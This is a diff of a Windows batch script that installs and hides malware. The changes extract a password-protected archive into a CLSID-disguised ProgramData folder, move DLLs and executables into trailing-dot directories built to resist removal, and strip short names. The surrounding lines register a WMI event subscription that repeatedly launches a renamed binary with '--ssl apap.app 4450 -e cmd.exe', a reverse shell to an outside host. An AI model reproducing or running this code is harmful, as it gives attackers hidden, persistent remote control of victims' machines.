@@ -1,15 +1,18 @@
+schtasks /Delete /TN "\Windows\Help" /F
+"%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" x -y -o+ -p963258741 "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\guard.rar" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
+
 mkdir \\.\%ProgramData%\config..\
 mkdir \\.\%ProgramData%\logdata..\
 mkdir %WINDIR%\Setup\Scripts
 
-move /Y "%ProgramData%\Comms\Index.exe" "\\.\%ProgramData%\logdata..\"
-move /Y "%ProgramData%\Comms\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Index.exe" "\\.\%ProgramData%\logdata..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\IconLib.dll" "\\.\%ProgramData%\logdata..\prn.ini"
 
-move /Y "%ProgramData%\Comms\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\Comms\vcruntime140.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\Comms\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
-move /Y "%ProgramData%\Comms\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
-rd /s /q "%ProgramData%\Comms"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libssl-1_1.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\vcruntime140.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
+move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
+rd /s /q "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 
 fsutil file setshortname C:\ProgramData\config..\ ""
 fsutil file setshortname C:\ProgramData\logdata..\ ""
@@ -42,3 +45,5 @@ powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='MCS'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 200 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='MCS'; CommandLineTemplate='%ProgramData%\config..\ShellExperienceHost.exe --ssl apap.app 4450 -e cmd.exe'} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
+
+sc start Performance
